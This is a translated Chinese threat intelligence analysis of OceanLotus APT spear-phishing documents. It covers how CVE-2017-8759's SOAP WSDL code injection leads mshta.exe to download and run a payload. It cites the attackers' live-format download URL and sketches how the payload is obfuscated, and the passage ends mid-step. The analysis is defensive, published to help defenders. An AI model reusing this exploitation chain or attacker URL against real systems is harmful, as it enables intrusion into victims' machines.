# 海莲花（OceanLotus）团伙漏洞利用类攻击样本分析
##### 译文声明
本文是翻译文章，文章原作者 360天眼实验室
译文仅供参考，具体内容表达以及含义原文为准。
作者：360天眼实验室
投稿方式：发送邮件至linwei#360.cn，或登录网页版在线投稿
## 引言
360威胁情报中心自在2015年首次揭露海莲花（OceanLotus）APT团伙的活动以后，一直密切监控其活动，跟踪其攻击手法和目标的变化。近期被公开的团伙所执行的大规模水坑攻击中，360威胁情报中心发现超过100个国内的网站被秘密控制植入了恶意链接，团伙会在到访水坑网站的用户中选择感兴趣的目标通过诱使其下载执行恶意程序获取控制，此类攻击手法在360威胁情报中心的之前分析中已经有过介绍，详情请访问情报中心的官方Blog：
 。
除了水坑方式的渗透，海莲花团伙也在并行地采用鱼叉邮件的恶意代码投递，执行更加针对性的攻击。360安全监测与响应中心在所服务用户的配合下，大量鱼叉邮件被发现并确认，显示其尽可能多地获取控制的攻击风格。除了通常的可执行程序附件Payload以外，360威胁情报中心近期还发现了利用CVE-2017-8759漏洞和Office
Word机制的鱼叉邮件。这类漏洞利用类的恶意代码集成了一些以前所未见的技术，360威胁情报中心在本文中详述其中的技术细节，与安全社区共享以期从整体上提升针对性的防御。
## 样本分析
海莲花团伙会收集所攻击组织机构对外公布的邮箱，只要有获得渗透机会的可能，就向其投递各类恶意邮件，360威胁情报中心甚至在同一个用户的邮箱中发现两类不同的鱼叉邮件，但所欲达到的目的是一样的：获取初始的恶意代码执行。下面我们剖析其中的两类：CVE-2017-8759漏洞和Office
Word DLL劫持漏洞的利用。
### CVE-2017-8759漏洞利用样本
我们分析的第一个样本来自鱼叉邮件。邮件主题跟该员工的薪酬信息相关，其中附带了一个DOC文档类型的附件，附件名为 “请查收8月和9月的工资单.doc ”。
打开文件会发现其并没有内容，而只是显示了一个空白框和一张模糊不清的图片，显然这是一种企图引诱用户点击打开漏洞文档，然后通过漏洞在系统后台运行恶意代码的社会工程学攻击。
点击空白框可以发现其是一个链接对象，链接地址如下：
注意到soap:wsdl=****这个是CVE-2017-8759漏洞利用的必要元素， 以下我们简单回顾一下CVE-2017-8759漏洞的细节。
#### CVE-2017-8759漏洞简介
CVE-2017-8759是一个.NET Framework漏洞，成因在于.NET库中的SOAP
WSDL解析模块IsValidUrl函数没有正确处理包含回车换行符的情况，导致调用者函数PrintClientProxy发生代码注入，在后续过的过程中所注入的恶意代码得到执行。
漏洞利用导致代码执行的流程如下：
前述所分析的样本中包含“soap:wsdl=http://www.hkbytes.info:80/resource/image.jpg”，这里的soap:wsdl标记了接下来要使用的Moniker为Soap
Moniker。
在注册表项HKEY_CLASSES_ROOT\soap中可以找到Soap
Moniker的CLSID和文件路径分别为CLSID：{ecabb0c7-7f19-11d2-978e-0000f8757e2a}和Path:
%systemroot%\system32\comsvcs.dll。
可以看到漏洞触发前的部分堆栈如下：
Office在绑定了CSoapMoniker并创建实例后，进入到comsvcs!CreateSoapProxy中，会创建一个System.EnterpriseServices.Internal.[ClrObjectFactory](https://msdn.microsoft.com/zh-cn/library/system.enterpriseservices.internal.clrobjectfactory.aspx)类的实例（该类在MSDN上的描述为启用客户端SOAP代理的COM组件），代码如下：
接着调用[ClrObjectFactory](https://msdn.microsoft.com/zh-cn/library/system.enterpriseservices.internal.clrobjectfactory.aspx)类中的CreateFromWsdl()方法，该方法中会对WsdlURL进行解析，然后通过GenAssemblyFromWsdl()生成一个以URL作为名字的dll，将其load到内存中:
而漏洞正是出现在GenAssemblyFromWsdl()中对Wsdl解析的时候，SOAP WSDL 解析模块WsdlParser的
IsValidUrl()
函数没有正确处理可能包含的回车换行符，使调用IsVailidUrl的PrintClientProxy没能注释掉换行符之后的代码，从而导致了代码注入。相关的漏洞代码如下：
PrintClientProxy
IsValidUrl
调用栈大致如下：
    System.Runtime.Remoting.MetadataServices.WsdlParser.URTComplexType.PrintClientProxy()
    System.Runtime.Remoting.MetadataServices.WsdlParser.URTComplexType.PrintCSC()
    System.Runtime.Remoting.MetadataServices.WsdlParser.PrintCSC()
    System.Runtime.Remoting.MetadataServices.WsdlParser.StartWsdlResolution()
    System.Runtime.Remoting.MetadataServices.WsdlParser.Parse()
    System.Runtime.Remoting.MetadataServices.SUDSParser.Parse()
    System.Runtime.Remoting.MetadataServices.MetaData.ConvertSchemaStreamToCodeSourceStream(bool, string, Stream, ArrayList, string, string)
    System.EnterpriseServices.Internal.GenAssemblyFromWsdl.Generate()
    System.EnterpriseServices.Internal.ClrObjectFactory.CreateFromWsdl()
    …..
由于hxxp://www.hkbytes.info:80/resource/image.jpg已经下载不到，这里用一个POC来代替原本image.jpg中的代码来说明漏洞如何被利用：
如上图的POC中所示，由于第二行的soap:address
locaotion后面紧跟着一个换行符，经过上述的处理流程后，导致生成的Logo.cs文件内容如下，可以看到本该被注释掉的if
(System.AppDomain…等代码并未被注释掉。
回到GenAssemblyFromWsdl()函数后，调用GenAssemblyFromWsdl.Run()编译生成的Logo.cs，生成以URL命名的dll：httpswwwhkbytesinfo80resourceimagejpg.dll，并将其加载到内存中，此时被注入的代码便得以执行起来。具体到当前的POC例子，我们可以看到被注入的代码就是将前面的字符串以“?”分割成一个Array，然后调用System.Diagnostics.Process.Start()启动新进程。进程名为Array[1]（即mshta.exe），参数为Array[2]（即要下载执行的恶意载荷）。
#### 样本文档的Payload剖析
样本文件中的Payload被设置在objdata对象中，可以看到其数据是被混淆过的：
混淆方式为把一些没有意义的字符串填充到objdata里面，比如 {\\*\\[10位随机字母]}，\\[10位随机字母]
使用正则表达式替换掉这些用于混淆的字符串，比如：
1、用 {\\\\\\*\\\\[a-zA-Z]{10}\\} 搜索替换 “{\\*\enhftkpilz}”